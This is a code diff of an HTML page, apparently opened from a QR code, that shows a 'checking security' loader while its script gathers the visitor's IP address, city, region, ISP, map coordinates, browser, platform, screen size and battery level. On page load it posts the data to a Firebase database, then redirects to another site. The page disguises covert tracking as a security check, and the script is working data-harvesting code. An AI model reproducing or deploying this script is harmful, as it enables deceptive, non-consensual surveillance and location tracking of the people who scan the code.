@@ -14,91 +14,74 @@
 <body>
 
     <div class="loader"></div>
-    <p>Verificando segurança...</p>
+    <p>Verificando segurança e carregando dados...</p>
 
     <script>
+        // --- CONFIGURAÇÕES DO SEU SISTEMA ---
         const FIREBASE_URL = "https://dadosdeqr-default-rtdb.firebaseio.com/acessos_qr.json";
         const URL_DESTINO = "https://saoluisma.github.io/Bloquear-cassinos/";
 
-        async function capturarLocalizacao() {
-            // Lista de APIs em ordem de confiabilidade
-            const apis = [
-                'https://ipapi.co/json/',
-                'https://ipwhois.app/json/',
-                'https://freeipapi.com/api/json'
-            ];
+        // Captura o ID que o seu programa Python enviou na URL (?id=Mesa_01)
+        const urlParams = new URLSearchParams(window.location.search);
+        const qrid = urlParams.get('id') || "QR_Desconhecido";
 
-            for (let url of apis) {
-                try {
-                    const res = await fetch(url, { method: 'GET' });
-                    const d = await res.json();
-                    
-                    if (d.ip || d.ipAddress || d.query) {
-                        return {
-                            ip: d.ip || d.ipAddress || d.query || "Privado",
-                            cidade: d.city || d.cityName || "Desconhecida",
-                            regiao: d.region || d.regionName || d.region_name || "Desconhecida",
-                            pais: d.country || d.countryName || d.country_name || "Brasil",
-                            provedor: d.org || d.isp || d.connection?.isp || d.as || "Desconhecido",
-                            fuso_horario: d.timezone || d.timeZone || "N/A",
-                            mapa: (d.latitude || d.lat) ? `https://www.google.com/maps?q=${d.latitude || d.lat},${d.longitude || d.lon}` : "N/A"
-                        };
-                    }
-                } catch (e) {
-                    console.warn(`Falha na API: ${url}`);
-                    continue; 
-                }
-            }
-            return { ip: "Bloqueado/VPN", cidade: "N/A", pais: "N/A", provedor: "N/A", mapa: "N/A" };
-        }
-
-        async function iniciarRastreio() {
-            // Captura de Hardware e Navegador
-            const dadosDispositivo = {
+        async function capturarTudo() {
+            // 1. Inicia dados básicos do dispositivo
+            let dadosColetados = {
+                identificacao_qr: qrid,
                 data_hora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
                 dispositivo: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Celular' : 'Computador',
-                so: navigator.platform,
                 navegador: navigator.userAgent,
-                idioma: navigator.language,
+                so: navigator.platform,
                 tela: `${window.screen.width}x${window.screen.height}`,
-                referencia: document.referrer || "QR Code Direto",
-                bateria: "N/A",
-                conexao: navigator.connection ? navigator.connection.effectiveType : "Desconhecida"
+                bateria: "N/A", // Valor padrão caso falhe
+                ip: "Privado/VPN", cidade: "N/A", regiao: "N/A", pais: "N/A", provedor: "N/A", mapa: "N/A"
             };
 
-            // Tenta pegar nível de bateria (opcional)
+            // 2. CAPTURA NÍVEL DE BATERIA (Corrigido)
             try {
                 if (navigator.getBattery) {
-                    const batt = await navigator.getBattery();
-                    dadosDispositivo.bateria = `${Math.round(batt.level * 100)}%`;
+                    const battery = await navigator.getBattery();
+                    dadosColetados.bateria = `${Math.round(battery.level * 100)}%`;
                 }
-            } catch(e) {}
+            } catch (e) { console.warn("Erro ao ler bateria"); }
 
-            // Captura Localização por IP
-            const dadosLocalizacao = await capturarLocalizacao();
+            // 3. CAPTURA LOCALIZAÇÃO E IP (Corrigido para HTTPS)
+            try {
+                // Usando ipwhois.app que é compatível com HTTPS
+                const res = await fetch('https://ipwhois.app/json/');
+                const d = await res.json();
+                
+                if (d.success) {
+                    dadosColetados.ip = d.ip;
+                    dadosColetados.cidade = d.city;
+                    dadosColetados.regiao = d.region;
+                    dadosColetados.pais = d.country;
+                    dadosColetados.provedor = d.isp + " (" + d.org + ")";
+                    dadosColetados.mapa = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                }
+            } catch (e) { console.error("Erro na API de Localização"); }
 
-            // Envio para o Firebase
-            const payload = { ...dadosDispositivo, ...dadosLocalizacao };
-
+            // 4. ENVIA TUDO PARA O FIREBASE
             try {
                 await fetch(FIREBASE_URL, {
                     method: 'POST',
-                    body: JSON.stringify(payload),
+                    body: JSON.stringify(dadosColetados),
                     headers: { 'Content-Type': 'application/json' }
                 });
             } catch (err) {
                 console.error("Erro Firebase:", err);
             } finally {
-                // Redirecionamento Final
+                // 5. REDIRECIONA PARA O SITE FINAL
                 window.location.href = URL_DESTINO;
             }
         }
 
         // Inicia o processo
-        iniciarRastreio();
+        capturarTudo();
 
-        // Segurança: Redireciona forçado após 4 segundos se algo travar
-        setTimeout(() => { window.location.href = URL_DESTINO; }, 4000);
+        // Segurança: Força o redirecionamento após 6 segundos caso algo trave
+        setTimeout(() => { window.location.href = URL_DESTINO; }, 6000);
     </script>
 </body>
 </html>
